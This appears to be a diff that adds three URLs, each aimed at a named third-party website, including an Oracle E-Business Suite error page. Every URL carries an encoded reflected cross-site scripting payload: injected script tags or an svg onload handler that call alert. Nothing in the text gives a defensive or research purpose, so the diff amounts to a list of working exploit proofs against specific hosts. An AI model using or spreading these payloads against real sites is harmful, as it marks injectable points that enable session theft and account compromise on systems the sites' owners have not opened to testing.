@@ -1,0 +1,3 @@
+http://aricivitavecchia.it/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://ip-109-144-000-128.cpe.my-wire.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://1.imgr.it/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('2O5ZMAggOaj0Rlh9BQJjFOW818W')%3E
